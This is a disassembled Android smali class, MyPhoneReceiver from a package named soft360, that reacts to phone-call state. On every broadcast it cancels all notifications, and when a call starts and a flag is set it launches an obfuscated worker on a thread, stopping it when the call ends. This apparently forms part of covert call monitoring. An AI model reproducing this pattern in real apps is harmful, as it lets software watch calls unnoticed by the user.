.class public Lcom/soft360/Receiver/MyPhoneReceiver;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field a:Leq;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    const/4 v1, 0x0

    :try_start_0
    const-string v0, "notification"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0}, Landroid/app/NotificationManager;->cancelAll()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    :goto_0
    :try_start_1
    const-string v0, "state"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "state"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    :cond_0
    if-eqz v1, :cond_1

    const/4 v0, 0x0

    invoke-static {v0}, LdU;->a(Landroid/content/Context;)LdU;

    sget-object v0, Landroid/telephony/TelephonyManager;->EXTRA_STATE_OFFHOOK:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-static {}, LdU;->k()Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz v0, :cond_2

    :try_start_2
    iget-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;

    invoke-virtual {v0}, Leq;->b()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :goto_1
    const/4 v0, 0x0

    :try_start_3
    iput-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;

    :cond_1
    :goto_2
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catch_1
    move-exception v0

    goto :goto_2

    :cond_2
    new-instance v0, Leq;

    invoke-direct {v0}, Leq;-><init>()V

    iput-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :try_start_4
    iget-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;

    invoke-virtual {v0}, Leq;->a()V

    iget-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Les;

    invoke-direct {v3, v0}, Les;-><init>(Leq;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    :cond_3
    :goto_3
    :try_start_5
    sget-object v0, Landroid/telephony/TelephonyManager;->EXTRA_STATE_IDLE:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {}, LdU;->k()Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    move-result v0

    if-eqz v0, :cond_1

    :try_start_6
    iget-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;

    invoke-virtual {v0}, Leq;->b()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_2
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_2

    :catch_2
    move-exception v0

    :try_start_7
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2

    :catch_3
    move-exception v0

    const/4 v2, 0x0

    iput-object v2, p0, Lcom/soft360/Receiver/MyPhoneReceiver;->a:Leq;

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    goto :goto_3

    :catch_4
    move-exception v0

    goto :goto_0
.end method
